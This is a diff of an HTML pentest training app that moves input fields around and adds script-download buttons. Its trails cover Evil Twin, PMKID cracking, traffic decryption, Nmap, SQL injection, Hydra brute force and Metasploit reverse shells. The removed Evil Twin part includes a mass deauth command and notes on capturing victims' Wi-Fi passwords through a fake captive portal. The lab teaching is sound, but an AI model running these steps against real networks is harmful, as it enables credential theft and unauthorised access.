-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="4"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Captive portal funcionando</span><span data-lang-en>Captive portal working</span></span></label>
-    </div>
-
-    <!-- FASE 5 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-danger);">Fase 5</div>
-        <h2><i class="fa-solid fa-burst"></i> <span data-lang-pt>Forçar Desconexão do AP Real</span><span data-lang-en>Force Disconnect from Real AP</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt>Agora, use <code>aireplay-ng</code> para desautenticar todos os clientes do AP <strong>real</strong>. Sem conexão, os dispositivos vão procurar o ESSID novamente e encontrarão nosso AP falso (que terá sinal mais forte se estivermos perto).</span>
-            <span data-lang-en>Now, use <code>aireplay-ng</code> to deauthenticate all clients from the <strong>real</strong> AP. Without a connection, devices will search for the ESSID again and find our fake AP (which will have a stronger signal if we're nearby).</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-bolt"></i> <span data-lang-pt>Deauth em massa (broadcast)</span><span data-lang-en>Mass deauth (broadcast)</span></div>
-            <div class="command-box">
-                <code data-cmd="sudo aireplay-ng -0 0 -a {bssid} {ifaceMon}">sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <div class="info-box info-warning">
-                <i class="fa-solid fa-triangle-exclamation"></i>
-                <span><span data-lang-pt><strong>-0 0</strong> = envio contínuo. Quando a vítima conectar ao seu AP e digitar a senha no portal, você verá no log do servidor HTTP. Para parar: <kbd>Ctrl+C</kbd>.</span><span data-lang-en><strong>-0 0</strong> = continuous sending. When the victim connects to your AP and enters the password in the portal, you'll see it in the HTTP server log. To stop: <kbd>Ctrl+C</kbd>.</span></span>
-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="5"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Credenciais capturadas via captive portal</span><span data-lang-en>Credentials captured via captive portal</span></span></label>
-    </div>
-
-    <!-- Completion -->
-    <div class="card-flat reveal" style="text-align: center; padding: var(--space-10);">
-        <i class="fa-solid fa-trophy" style="font-size: 3rem; color: var(--accent-danger); margin-bottom: var(--space-4); display: block;"></i>
-        <h2><span data-lang-pt>Trilha Evil Twin Completa!</span><span data-lang-en>Evil Twin Trail Complete!</span></h2>
-        <p class="text-muted" style="margin-top: var(--space-2); margin-bottom: var(--space-6);">
-            <span data-lang-pt>Você dominou engenharia social em redes Wi-Fi!</span>
-            <span data-lang-en>You mastered social engineering on Wi-Fi networks!</span>
-        </p>
-        <div class="flex justify-center gap-4 flex-wrap">
-            <a href="#/pmkid" class="btn btn-primary"><i class="fa-solid fa-arrow-right"></i> PMKID</a>
-            <a href="#/home" class="btn btn-ghost"><i class="fa-solid fa-house"></i> <span data-lang-pt>Início</span><span data-lang-en>Home</span></a>
-        </div>
-    </div>
 </div>
 
     </template>
@@ -1019,36 +670,15 @@
             <span data-lang-pt>O ataque PMKID é revolucionário: <strong>não precisa de nenhum cliente conectado</strong>. Capturamos o PMKID diretamente do primeiro frame de associação do roteador. Mais rápido e silencioso que o handshake tradicional.</span>
             <span data-lang-en>The PMKID attack is revolutionary: <strong>no connected client needed</strong>. We capture PMKID directly from the router's first association frame. Faster and stealthier than traditional handshake.</span>
         </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
+        <div style="margin-top: var(--space-4); max-width: 500px;">
             <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
                 <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
                 <span class="progress-label text-sm" style="color: var(--accent-purple);">0%</span>
             </div>
             <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="pmkid" style="width: 0%; background: var(--accent-purple);"></div></div>
-        </div>
-    </div>
-
-    <!-- Inputs -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-purple);"></i> <span data-lang-pt>Configuração</span><span data-lang-en>Setup</span></h3>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Interface</span><span data-lang-en>Interface</span></label>
-                <input type="text" id="iface" value="wlan0" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label>BSSID (<span data-lang-pt>MAC do Roteador</span><span data-lang-en>Router MAC</span>)</label>
-                <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span></label>
-                <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label><span data-lang-pt>Caminho da Wordlist</span><span data-lang-en>Wordlist Path</span></label>
-                <input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt" data-cmd-input>
+            <div class="flex gap-2 flex-wrap" style="margin-top: var(--space-4);">
+                <button class="btn btn-outline btn-sm" onclick="Commands.copyAllTrailCommands()"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar Todos</span><span data-lang-en>Copy All</span></button>
+                <button class="btn btn-outline btn-sm" onclick="Commands.downloadTrailScript('PMKID_Capture')"><i class="fa-solid fa-download"></i> <span data-lang-pt>Baixar Script (.sh)</span><span data-lang-en>Download Script (.sh)</span></button>
             </div>
         </div>
     </div>
@@ -1061,6 +691,15 @@
             <span data-lang-pt>Ative o modo monitor. O <code>hcxdumptool</code> precisa da interface em modo monitor.</span>
             <span data-lang-en>Enable monitor mode. <code>hcxdumptool</code> requires the interface in monitor mode.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-purple);">
+            <div class="phase-inputs-title" style="color: var(--accent-purple);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Preencha antes de continuar</span><span data-lang-en>Fill in before continuing</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Interface</span><span data-lang-en>Interface</span></label>
+                    <input type="text" id="iface" value="wlan0" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
             <div class="command-box" style="margin-bottom: var(--space-4);">
@@ -1083,6 +722,19 @@
             <span data-lang-pt>O <code>hcxdumptool</code> envia solicitações de associação ao roteador alvo. Se o roteador suportar PMKID (a maioria dos modernos), ele responde com o PMKID no primeiro frame — <strong>sem precisar de nenhum cliente</strong>.</span>
             <span data-lang-en><code>hcxdumptool</code> sends association requests to the target router. If the router supports PMKID (most modern ones do), it responds with PMKID in the first frame — <strong>without needing any client</strong>.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-purple);">
+            <div class="phase-inputs-title" style="color: var(--accent-purple);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>MAC do roteador alvo</span><span data-lang-en>Target router MAC</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label>BSSID (<span data-lang-pt>MAC do Roteador</span><span data-lang-en>Router MAC</span>)</label>
+                    <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
+                </div>
+                <div class="input-group">
+                    <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span></label>
+                    <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-download"></i> <span data-lang-pt>Captura PMKID</span><span data-lang-en>PMKID Capture</span></div>
             <span class="command-label"><span data-lang-pt>1. Criar arquivo com o MAC alvo (filtro):</span><span data-lang-en>1. Create file with target MAC (filter):</span></span>
@@ -1133,6 +785,15 @@
             <span data-lang-pt>Agora use o <code>hashcat</code> com a GPU para quebrar o PMKID. O modo <code>-m 22000</code> suporta tanto PMKID quanto handshake EAPOL.</span>
             <span data-lang-en>Now use <code>hashcat</code> with GPU to crack the PMKID. Mode <code>-m 22000</code> supports both PMKID and EAPOL handshake.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-purple);">
+            <div class="phase-inputs-title" style="color: var(--accent-purple);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Caminho da wordlist</span><span data-lang-en>Wordlist path</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Caminho da Wordlist</span><span data-lang-en>Wordlist Path</span></label>
+                    <input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-fire"></i> <span data-lang-pt>Ataque com Dicionário</span><span data-lang-en>Dictionary Attack</span></div>
             <div class="command-box" style="margin-bottom: var(--space-4);">
@@ -1179,7 +840,6 @@
         </div>
     </div>
 </div>
-
     </template>
     <template id="template-wireshark">
 <!-- TRILHA WIRESHARK — Captura e Descriptografia de Tráfego -->
@@ -1195,42 +855,15 @@
             <span data-lang-pt>Esta trilha ensina os conceitos práticos de captura de pacotes de dados no ar, validação do Handshake de 4 vias (EAPOL) e a descriptografia de tráfego de rede Wi-Fi usando Wireshark GUI, airdecap-ng e tshark.</span>
             <span data-lang-en>This trail teaches the practical concepts of capturing over-the-air data packets, validating the 4-Way Handshake (EAPOL), and decrypting Wi-Fi network traffic using Wireshark GUI, airdecap-ng, and tshark.</span>
         </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
+        <div style="margin-top: var(--space-4); max-width: 500px;">
             <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
                 <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
                 <span class="progress-label text-sm" style="color: #00d4ff;">0%</span>
             </div>
             <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="wireshark" style="width: 0%; background: #00d4ff;"></div></div>
-        </div>
-    </div>
-
-    <!-- Inputs de Configuração -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: #00d4ff;"></i> <span data-lang-pt>Configuração do Laboratório</span><span data-lang-en>Lab Configuration</span></h3>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Interface Monitor</span><span data-lang-en>Monitor Interface</span></label>
-                <input type="text" id="ifaceMon" value="wlan0mon" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label>SSID (Nome do AP)</label>
-                <input type="text" id="essid" value="RedeLaboratorio" data-cmd-input>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label>BSSID (MAC do AP)</label>
-                <input type="text" id="target" value="AA:BB:CC:DD:EE:11" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label><span data-lang-pt>Canal (Channel)</span><span data-lang-en>Channel</span></label>
-                <input type="text" id="channel" value="6" data-cmd-input>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Senha do Wi-Fi</span><span data-lang-en>Wi-Fi Password</span></label>
-                <input type="text" id="password" value="minhasenha123" data-cmd-input>
+            <div class="flex gap-2 flex-wrap" style="margin-top: var(--space-4);">
+                <button class="btn btn-outline btn-sm" onclick="Commands.copyAllTrailCommands()"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar Todos</span><span data-lang-en>Copy All</span></button>
+                <button class="btn btn-outline btn-sm" onclick="Commands.downloadTrailScript('Wireshark_Decrypt')"><i class="fa-solid fa-download"></i> <span data-lang-pt>Baixar Script (.sh)</span><span data-lang-en>Download Script (.sh)</span></button>
             </div>
         </div>
     </div>
@@ -1243,6 +876,25 @@
             <span data-lang-pt>Para decodificar o tráfego Wi-Fi, primeiro precisamos capturar os frames de dados brutos que viajam pelo ar em um arquivo do tipo <code>.cap</code> ou <code>.pcap</code>. O <code>airodump-ng</code> captura todo o tráfego da rede do canal e salva em disco, incluindo o handshake EAPOL necessário para a decodificação.</span>
             <span data-lang-en>To decode Wi-Fi traffic, we first must capture raw data frames traveling through the air into a <code>.cap</code> or <code>.pcap</code> file. <code>airodump-ng</code> captures all channel traffic and saves it to disk, including the required EAPOL handshake.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: #00d4ff;">
+            <div class="phase-inputs-title" style="color: #00d4ff;"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Dados para a captura</span><span data-lang-en>Capture settings</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Interface Monitor</span><span data-lang-en>Monitor Interface</span></label>
+                    <input type="text" id="ifaceMon" value="wlan0mon" data-cmd-input>
+                </div>
+                <div class="input-group">
+                    <label>BSSID (MAC do AP)</label>
+                    <input type="text" id="target" value="AA:BB:CC:DD:EE:11" data-cmd-input>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Canal (Channel)</span><span data-lang-en>Channel</span></label>
+                    <input type="text" id="channel" value="6" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comando de Captura</span><span data-lang-en>Capture Command</span></div>
             <div class="command-box">
@@ -1265,6 +917,19 @@
             <span data-lang-pt>Por padrão, o Wireshark não consegue ler pacotes WPA2 criptografados. Ele exibirá apenas frames do tipo <code>802.11 Data</code> sem conteúdo de rede IP. Para revelar o conteúdo dos pacotes, configuramos a chave e o nome da rede nas preferências globais.</span>
             <span data-lang-en>By default, Wireshark cannot read encrypted WPA2 packets. It will display only <code>802.11 Data</code> frames without IP network payloads. To reveal packet payloads, we configure the decryption key and SSID in global preferences.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: #00d4ff;">
+            <div class="phase-inputs-title" style="color: #00d4ff;"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Credenciais da rede (já conhecidas)</span><span data-lang-en>Network credentials (already known)</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label>SSID (Nome do AP)</label>
+                    <input type="text" id="essid" value="RedeLaboratorio" data-cmd-input>
+                </div>
+                <div class="input-group">
+                    <label><span data-lang-pt>Senha do Wi-Fi</span><span data-lang-en>Wi-Fi Password</span></label>
+                    <input type="text" id="password" value="minhasenha123" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area text-muted" style="font-size: var(--fs-sm); line-height: 1.6;">
             <p style="margin-bottom: var(--space-3);"><strong style="color: var(--accent-primary);"><span data-lang-pt>Instruções de Configuração no Analisador:</span><span data-lang-en>Configuration Steps in Analyzer:</span></strong></p>
             <ol style="padding-left: var(--space-5);">
@@ -1340,7 +1005,6 @@
         </div>
     </div>
 </div>
-
     </template>
     <template id="template-nmap">
 <!-- TRILHA NMAP — Network Scanning -->
@@ -1356,23 +1020,15 @@
             <span data-lang-pt>O escaneamento de rede é a primeira fase ativa de qualquer pentest. O Nmap permite mapear dispositivos ativos, descobrir portas abertas, identificar serviços, sistemas operacionais e até detectar vulnerabilidades conhecidas.</span>
             <span data-lang-en>Network scanning is the first active phase of any pentest. Nmap allows you to map active devices, discover open ports, identify services, operating systems, and even detect known vulnerabilities.</span>
         </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
+        <div style="margin-top: var(--space-4); max-width: 500px;">
             <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
                 <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
                 <span class="progress-label text-sm" style="color: var(--accent-secondary);">0%</span>
             </div>
             <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="nmap" style="width: 0%; background: var(--accent-secondary);"></div></div>
-        </div>
-    </div>
-
-    <!-- Inputs -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-secondary);"></i> <span data-lang-pt>Configuração do Escaneamento</span><span data-lang-en>Scan Configuration</span></h3>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>IP ou Subrede Alvo</span><span data-lang-en>Target IP or Subnet</span></label>
-                <input type="text" id="target" value="192.168.1.100" data-cmd-input>
-                <span class="input-hint"><span data-lang-pt>Ex: 192.168.1.100 ou 192.168.1.0/24</span><span data-lang-en>e.g., 192.168.1.100 or 192.168.1.0/24</span></span>
+            <div class="flex gap-2 flex-wrap" style="margin-top: var(--space-4);">
+                <button class="btn btn-outline btn-sm" onclick="Commands.copyAllTrailCommands()"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar Todos</span><span data-lang-en>Copy All</span></button>
+                <button class="btn btn-outline btn-sm" onclick="Commands.downloadTrailScript('Nmap_Recon')"><i class="fa-solid fa-download"></i> <span data-lang-pt>Baixar Script (.sh)</span><span data-lang-en>Download Script (.sh)</span></button>
             </div>
         </div>
     </div>
@@ -1385,6 +1041,16 @@
             <span data-lang-pt>Antes de escanear portas, precisamos descobrir quais dispositivos estão ligados na rede local. O parâmetro <code>-sn</code> diz ao Nmap para apenas verificar se o host está ativo, sem escanear portas (muito mais rápido e silencioso).</span>
             <span data-lang-en>Before scanning ports, we need to discover which devices are powered on in the local network. The <code>-sn</code> flag tells Nmap to only check if the host is up, without scanning ports (much faster and stealthier).</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-secondary);">
+            <div class="phase-inputs-title" style="color: var(--accent-secondary);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Defina o alvo</span><span data-lang-en>Define the target</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>IP ou Subrede Alvo</span><span data-lang-en>Target IP or Subnet</span></label>
+                    <input type="text" id="target" value="192.168.1.100" data-cmd-input>
+                    <span class="input-hint"><span data-lang-pt>Ex: 192.168.1.100 ou 192.168.1.0/24</span><span data-lang-en>e.g., 192.168.1.100 or 192.168.1.0/24</span></span>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
             <div class="command-box">
@@ -1471,7 +1137,6 @@
         </div>
     </div>
 </div>
-
     </template>
     <template id="template-web">
 <!-- TRILHA WEB AUDITING — Gobuster & SQLmap -->
@@ -1487,29 +1152,15 @@
             <span data-lang-pt>Aplicações web são os principais vetores de entrada em corporações. Nesta trilha, aprenderemos a mapear caminhos ocultos em um servidor e a extrair o banco de dados via vulnerabilidade de SQL Injection.</span>
             <span data-lang-en>Web applications are major entry vectors in enterprise networks. In this trail, we'll learn to map hidden paths on a server and extract database contents via SQL Injection vulnerabilities.</span>
         </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
+        <div style="margin-top: var(--space-4); max-width: 500px;">
             <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
                 <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
                 <span class="progress-label text-sm" style="color: var(--accent-pink);">0%</span>
             </div>
             <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="web" style="width: 0%; background: var(--accent-pink);"></div></div>
-        </div>
-    </div>
-
-    <!-- Inputs -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-pink);"></i> <span data-lang-pt>Configuração Web</span><span data-lang-en>Web Setup</span></h3>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>URL Alvo</span><span data-lang-en>Target URL</span></label>
-                <input type="text" id="targetUrl" value="http://192.168.1.100/index.php?id=1" data-cmd-input>
-                <span class="input-hint"><span data-lang-pt>URL para testar SQL Injection (precisa do parâmetro vulnerável)</span><span data-lang-en>URL to test SQL Injection (requires query parameter)</span></span>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Wordlist de Diretórios</span><span data-lang-en>Directory Wordlist</span></label>
-                <input type="text" id="wordlist" value="/usr/share/wordlists/dirb/common.txt" data-cmd-input>
+            <div class="flex gap-2 flex-wrap" style="margin-top: var(--space-4);">
+                <button class="btn btn-outline btn-sm" onclick="Commands.copyAllTrailCommands()"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar Todos</span><span data-lang-en>Copy All</span></button>
+                <button class="btn btn-outline btn-sm" onclick="Commands.downloadTrailScript('Web_Auditing')"><i class="fa-solid fa-download"></i> <span data-lang-pt>Baixar Script (.sh)</span><span data-lang-en>Download Script (.sh)</span></button>
             </div>
         </div>
     </div>
@@ -1522,6 +1173,22 @@
             <span data-lang-pt>Desenvolvedores frequentemente deixam arquivos ou painéis administrativos ocultos. Usamos o <code>gobuster</code> com uma wordlist para testar milhares de caminhos web comuns e localizar páginas de login ou diretórios ocultos.</span>
             <span data-lang-en>Developers often leave hidden files or administrative portals. We use <code>gobuster</code> with a wordlist to test thousands of common web paths and locate hidden login pages or directories.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-pink);">
+            <div class="phase-inputs-title" style="color: var(--accent-pink);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Configure o alvo web</span><span data-lang-en>Configure the web target</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>URL Alvo</span><span data-lang-en>Target URL</span></label>
+                    <input type="text" id="targetUrl" value="http://192.168.1.100/index.php?id=1" data-cmd-input>
+                    <span class="input-hint"><span data-lang-pt>URL para testar SQL Injection (precisa do parâmetro vulnerável)</span><span data-lang-en>URL to test SQL Injection (requires query parameter)</span></span>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Wordlist de Diretórios</span><span data-lang-en>Directory Wordlist</span></label>
+                    <input type="text" id="wordlist" value="/usr/share/wordlists/dirb/common.txt" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comando de Reconhecimento</span><span data-lang-en>Scan Command</span></div>
             <div class="command-box">
@@ -1604,7 +1271,6 @@
         </div>
     </div>
 </div>
-
     </template>
     <template id="template-hydra">
 <!-- TRILHA HYDRA — Brute Force -->
@@ -1620,33 +1286,15 @@
             <span data-lang-pt>Quando não temos vulnerabilidades lógicas para explorar, testamos a força das credenciais de serviços expostos. O THC-Hydra é a ferramenta mais rápida do mercado para ataques de brute force online contra mais de 50 protocolos.</span>
             <span data-lang-en>When logical vulnerabilities are absent, we test credential strength of exposed services. THC-Hydra is the fastest online brute force tool supporting over 50 network protocols.</span>
         </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
+        <div style="margin-top: var(--space-4); max-width: 500px;">
             <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
                 <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
                 <span class="progress-label text-sm" style="color: var(--accent-warning);">0%</span>
             </div>
             <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="hydra" style="width: 0%; background: var(--accent-warning);"></div></div>
-        </div>
-    </div>
-
-    <!-- Inputs -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-warning);"></i> <span data-lang-pt>Configuração do Alvo</span><span data-lang-en>Target Configuration</span></h3>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>IP Alvo</span><span data-lang-en>Target IP</span></label>
-                <input type="text" id="target" value="192.168.1.100" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label><span data-lang-pt>Nome de Usuário</span><span data-lang-en>Username</span></label>
-                <input type="text" id="user" value="admin" data-cmd-input>
-                <span class="input-hint"><span data-lang-pt>Login para tentar quebrar (ex: admin, root)</span><span data-lang-en>Login to target (e.g., admin, root)</span></span>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Dicionário de Senhas</span><span data-lang-en>Password Wordlist</span></label>
-                <input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt" data-cmd-input>
+            <div class="flex gap-2 flex-wrap" style="margin-top: var(--space-4);">
+                <button class="btn btn-outline btn-sm" onclick="Commands.copyAllTrailCommands()"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar Todos</span><span data-lang-en>Copy All</span></button>
+                <button class="btn btn-outline btn-sm" onclick="Commands.downloadTrailScript('Hydra_Brute')"><i class="fa-solid fa-download"></i> <span data-lang-pt>Baixar Script (.sh)</span><span data-lang-en>Download Script (.sh)</span></button>
             </div>
         </div>
     </div>
@@ -1659,6 +1307,15 @@
             <span data-lang-pt>Ataques de brute force online geram muito ruído de rede e logs no sistema. Só realizamos o ataque após confirmar que o serviço (ex: SSH na porta 22, FTP na 21) está ativo usando o Nmap.</span>
             <span data-lang-en>Online brute force attacks generate network noise and log entries. We only launch the attack after verifying the targeted service (e.g., SSH on port 22, FTP on 21) is active using Nmap.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-warning);">
+            <div class="phase-inputs-title" style="color: var(--accent-warning);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Defina o alvo</span><span data-lang-en>Define the target</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>IP Alvo</span><span data-lang-en>Target IP</span></label>
+                    <input type="text" id="target" value="192.168.1.100" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Confirmar porta SSH</span><span data-lang-en>Verify SSH Port</span></div>
             <div class="command-box">
@@ -1677,6 +1334,20 @@
             <span data-lang-pt>Se suspeitamos de um usuário específico (ex: <code>root</code>), usamos a flag <code>-l</code> (minúsculo) para fixar o login e <code>-P</code> (maiúsculo) para a lista de senhas.</span>
             <span data-lang-en>If we target a specific user (e.g., <code>root</code>), we use the <code>-l</code> flag (lowercase) to fix the login, and <code>-P</code> (uppercase) for the password wordlist.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-warning);">
+            <div class="phase-inputs-title" style="color: var(--accent-warning);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Credenciais para o ataque</span><span data-lang-en>Attack credentials</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Nome de Usuário</span><span data-lang-en>Username</span></label>
+                    <input type="text" id="user" value="admin" data-cmd-input>
+                    <span class="input-hint"><span data-lang-pt>Login para tentar quebrar (ex: admin, root)</span><span data-lang-en>Login to target (e.g., admin, root)</span></span>
+                </div>
+                <div class="input-group">
+                    <label><span data-lang-pt>Dicionário de Senhas</span><span data-lang-en>Password Wordlist</span></label>
+                    <input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-hammer"></i> Hydra SSH</div>
             <div class="command-box">
@@ -1741,7 +1412,6 @@
         </div>
     </div>
 </div>
-
     </template>
     <template id="template-metasploit">
 <!-- TRILHA METASPLOIT — Exploitation -->
@@ -1757,33 +1427,15 @@
             <span data-lang-pt>O Metasploit Framework é a plataforma de exploração mais utilizada no mundo. Com ele, podemos testar exploits públicos contra sistemas vulneráveis, gerenciar payloads e obter acesso remoto via sessões interativas do Meterpreter.</span>
             <span data-lang-en>The Metasploit Framework is the world's most widely used exploitation platform. It allows testers to deploy exploits, manage payloads, and gain interactive remote access via Meterpreter sessions.</span>
         </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
+        <div style="margin-top: var(--space-4); max-width: 500px;">
             <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
                 <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
                 <span class="progress-label text-sm" style="color: var(--accent-danger);">0%</span>
             </div>
             <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="metasploit" style="width: 0%; background: var(--accent-danger);"></div></div>
-        </div>
-    </div>
-
-    <!-- Inputs -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-danger);"></i> <span data-lang-pt>Configuração da Exploração</span><span data-lang-en>Exploitation Setup</span></h3>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>IP do Alvo (RHOSTS)</span><span data-lang-en>Target IP (RHOSTS)</span></label>
-                <input type="text" id="target" value="192.168.1.100" data-cmd-input>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Seu IP (LHOST)</span><span data-lang-en>Your IP (LHOST)</span></label>
-                <input type="text" id="lhost" value="10.10.14.5" data-cmd-input>
-                <span class="input-hint"><span data-lang-pt>IP da sua máquina Kali Linux para receber o shell reverso</span><span data-lang-en>Your Kali Linux IP address to receive the reverse shell connection</span></span>
-            </div>
-            <div class="input-group">
-                <label><span data-lang-pt>Porta Local (LPORT)</span><span data-lang-en>Local Port (LPORT)</span></label>
-                <input type="text" id="lport" value="4444" data-cmd-input>
